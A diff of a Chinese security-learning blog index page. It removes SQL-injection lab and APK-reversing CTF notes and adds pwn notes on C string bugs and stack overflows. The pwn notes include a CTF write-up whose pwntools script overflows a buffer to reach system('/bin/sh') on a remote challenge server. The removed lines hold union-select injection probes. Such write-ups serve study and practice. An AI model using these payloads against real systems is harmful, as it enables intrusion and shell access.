+<p>就是将子进程挂起或者立即结束返回状态，若无子进程返回-1。</p>
+<p>进程的用户标识号和进程标识号等之后再看吧，内容不多，暂时搁浅。</p>
 
           
         
@@ -1446,7 +1493,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-3/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hhd">
@@ -1465,7 +1512,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/09/20/sql-3/" itemprop="url">好玩的sql第三篇</a></h1>
+                <a class="post-title-link" href="/2017/09/20/sql-6/" itemprop="url">好玩的sql第六篇</a></h1>
         
 
         <div class="post-meta">
@@ -1539,9 +1586,7 @@
       
         
           
-            <p>第三篇与一二篇又有点类似，不过php写的形式有点不同，有些程序员花样就是多…</p>
-<p>同样输入?id=1’<br>以下是三次的对比错误返回：<br>1.Erreur de syntaxe près de ‘’1’’ LIMIT 0,1’ à la ligne 1<br>2.Erreur de syntaxe près de ‘’ LIMIT 0,1’ à la ligne 1<br>3.Erreur de syntaxe près de ‘’1’’) LIMIT 0,1’ à la ligne 1</p>
-<p>?id=1’) union select 1,2,3–+<br>与一二篇类似。</p>
+            <p>不一样的就是id=1”<br>其余与第五篇一毛一样</p>
 
           
         
@@ -1590,7 +1635,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/ctf-逆向-1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hhd">
@@ -1609,7 +1654,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/09/20/ctf-逆向-1/" itemprop="url">ctf.逆向.1</a></h1>
+                <a class="post-title-link" href="/2017/09/20/pwn/" itemprop="url">pwn学习</a></h1>
         
 
         <div class="post-meta">
@@ -1644,8 +1689,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf-逆向/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf.逆向</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -1683,16 +1728,38 @@
       
         
           
-            <p> 这次是对上次某被日平台未继续的比赛的总结。</p>
-<blockquote>
-<p>简单apk逆向</p>
+            <h2 id="C与C-安全编码"><a href="#C与C-安全编码" class="headerlink" title="C与C++安全编码"></a>C与C++安全编码</h2><blockquote>
+<p>有关字符串的一些概念</p>
 </blockquote>
-<p>做题的时候，对逆向完全不懂的我，打开了IDA然后一脸懵逼。<br>学长提示用 <strong><em>jadX.jar</em></strong> ,然后打开了flag.apk。<br>在目录中看到这个包： <strong><em>com.example.administrator.flag</em></strong><br>这直接告诉我们看这个包就能找到flag。</p>
+<p><strong>字符串</strong><br>c语言中都是以数组存储字符串，以\0作为字符串结尾，低位地址是数组首元素地址，高位地址是数组末元素地址。<br><em>sizeof</em>  用来计算数组大小。但是对于数组与指针应用时，sizeof对同一个数组的大小计算不同。果然我们学的是基础的c语言，如果当时学仔细一点，就应该发现这个问题的。</p>
+<p><strong>宽字节</strong>简单来说就是大一点的字符，需要更多空间。</p>
+<p><strong>字符串字面值</strong>就是这个字符串的值，宽字符串前缀是L</p>
+<p><strong>字符串类型</strong>：C语言中字符串常量类型为int<br>以下结果是4,1.告诉我们C语言中神奇的存储，我以前都没怎么注意说实话…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#define  x &apos;a&apos;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char a[1];</div><div class="line">	printf(&quot;%ld\n&quot;,sizeof(x));</div><div class="line">	printf(&quot;%ld\n&quot;,sizeof(a));</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><strong>计算字符串大小</strong><br>strlen函数是我们经常用来计算字符串元素个数的，但是如果应用于宽字节，就会导致错误。strlen函数一旦遇到空字节就判断字符串结束，但是宽字符包含空字节。所以会产生错误。</p>
 <blockquote>
-<p>以下列出重点代码</p>
+<p>字符串的常见错误</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">if (MainActivity.this.check(&quot;***admin***&quot;.trim(), MainActivity.this.pas.getText().toString().trim()))</div><div class="line"></div><div class="line">private boolean check(String user, String pass) throws NoSuchAlgorithmException &#123;</div><div class="line">        MessageDigest md5 = MessageDigest.getInstance(&quot;MD5&quot;);</div><div class="line">        md5.reset();</div><div class="line">        md5.update(user.getBytes());</div><div class="line">        String hexstr = bytes2hexstr(***md5***.digest());</div><div class="line">        StringBuilder sb = new StringBuilder();</div><div class="line">        for (int i = 0; i &lt; hexstr.length(); ***i += 2***) &#123;</div><div class="line">            sb.append(hexstr.charAt(i));</div><div class="line">        &#125;</div><div class="line">        return sb.toString().equals(pass);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
-<p>以上三个加粗的地方就是核心，告诉我们需要将<strong><em>admin</em></strong> <strong><em>MD5加密</em></strong>，然后<strong><em>再隔一位取</em></strong>就是flag。</p>
+<p>最常见的字符串错误：无界字符串复制错误，差一错误，空结尾错误，字符串截断错误。</p>
+<p>一、无界字符串复制<br>例如gets就是一个很麻烦的例子。<br>当定义数组小于输入字符串时，就会发生错误。<br>同样的，命令行参数输入，如果复制进定义的数组，但是定义数组空间不够的话，就会发生错误。</p>
+<p>二、差一错误<br>与数组越界类似，预定数组长度不够的情况下会发生。</p>
+<p>三、空字符结尾错误<br>指的是字符串数组没有以正确的空字符结尾。<br>比如，strncpy复制不超过n个字符，很可能为复制进空字符结尾，这样会导致数组很大很大，超过想象，那么对另一个数组进行操作时，就会发生错误。有时候编译器不会告诉你错误，但是漏洞就会存在。</p>
+<p>四、字符串截断<br>数组长度不足以容纳一个字符串的内容时，会发生字符串截取，程序员为了防止缓冲区溢出，可能会用到字符串截取，有可能会导致丢失数据或者出现漏洞。</p>
+<p>五、与函数无关的字符串错误<br>这个我感觉发生的概率比前几个高。<br>简略版代码：（略略略）buff[128] buff[i]=a[i] buff[i]=’\0’</p>
+<blockquote>
+<p>字符串漏洞及其利用</p>
+</blockquote>
+<p><strong>一、缓冲区溢出</strong><br>名字虽然很高深的样子，其实就是数组或者特定分配的内存空间外写进数据，就称为缓冲区溢出。未进行隐式的边界检查。</p>
+<p><strong>二、栈管理及栈溢出</strong><br><em>基本概念</em>：从C语言来说就是 <em>先进后出</em> 的某个对内存的操作后的内存（= =）<br>一般来说，弹 <em>出栈</em> 意味着栈指针需要 <em>递增</em> 。栈在压入变量之后一般还会在最后压入返回地址，这意味着一旦这一段结束即可返回。（可能是错的，只是暂时的总结）<br><em>栈溢出</em>：由于栈在内存中按顺序存储，一个栈可能存储许多不同类型的数据，包括变量，指针，地址等等。如果用户恶意输入，很可能使得数据泄露或者越过某些数据检验。比如，简单的弧注入攻击。<br><em>代码注入</em>：被恶意注入的代码也叫外壳代码，攻击者往往利用某个子例程的返回地址导致栈混乱，从而获取该程序相同的权限，如果是root权限，即是开一个远程shell，获取最高权限。<br>恶意参数的特征：（感觉很有趣）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">有漏洞的程序必须接受它作为合法的输入</div><div class="line">参数，以及其他可控制的输入，必须导致有漏洞的代码路径得到执行</div><div class="line">参数不能在程序将控制权转移到shellcode之前导致程序异常中止</div></pre></td></tr></table></figure>
+<h2 id="个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。"><a href="#个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。" class="headerlink" title="个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。"></a>个人觉得第一点是程序写的不好，第二点是你输入的恶意参数必须能干点事，第三点就是你不能输入的参数直接把程序搞崩。</h2><blockquote>
+<p>题目</p>
+</blockquote>
+<p>给出了a.out<br>第一步，反汇编。核心代码如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">一、</div><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  _x86_get_pc_thunk_ax();</div><div class="line">  vul();</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">二、</div><div class="line">void vul()</div><div class="line">&#123;</div><div class="line">  char a[100]; // [sp+Ch] [bp-6Ch]@1</div><div class="line"></div><div class="line">  puts(&quot;--------------------------------------------------------------------------&quot;);</div><div class="line">  printf(</div><div class="line">    &quot;杩欎釜绋嬪簭閲岄潰鏈変釜鍙埍鐨勫皬濮愬锛屽ス鍦08p,浣嗘槸涓囨伓鐨勭帇灏忓悰涓嶄細璋冪敤濂癸紝鐣ョ暐鐣ワ紒\n&quot;,</div><div class="line">    xiaoxiannv);</div><div class="line">  fflush(0);</div><div class="line">  puts(&quot;     缁欎綘涓満浼氾紝璁╀綘璇村彞璇濓紝瑕佹槸浣犺兘鎰熷姩灏忓悰锛岄偅涔堝氨璁╀綘鍜屽皬濮愬瀵硅瘽锛);</div><div class="line">  puts(&quot;--------------------------------------------------------------------------&quot;);</div><div class="line">  fflush(0);</div><div class="line">  read(0, a, 0x3E8u);</div><div class="line">  puts(&quot;emmmmm锛屼笉鏁㈠姩锛屼竴鐐归兘涓嶆暍鍔紒&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">三、</div><div class="line">void xiaoxiannv()</div><div class="line">&#123;</div><div class="line">  int v0; // eax@1</div><div class="line"></div><div class="line">  v0 = _x86_get_pc_thunk_ax();</div><div class="line">  system(&amp;aBinSh[v0 - 134513874]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>main函数中跳转到vul函数，重点关注read(0, a, 0x3E8u)这句话，这个是把a的大小放入内存，这样就容易造成栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">payload = &apos;a&apos;*112+p32(0x80484c6)</div><div class="line">p = remote(&apos;121.42.189.18&apos;,5009)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div><div class="line">print p.recvall()</div></pre></td></tr></table></figure>
+<p>由char a[100]; // [sp+Ch] [bp-6Ch]@1可知，a的实际内存大小为108再加上ebp的大小一共为112。再跳到xiaoxiannv那个函数。<br>再就是关于linux命令的知识了。</p>
+<hr>
 
           
         
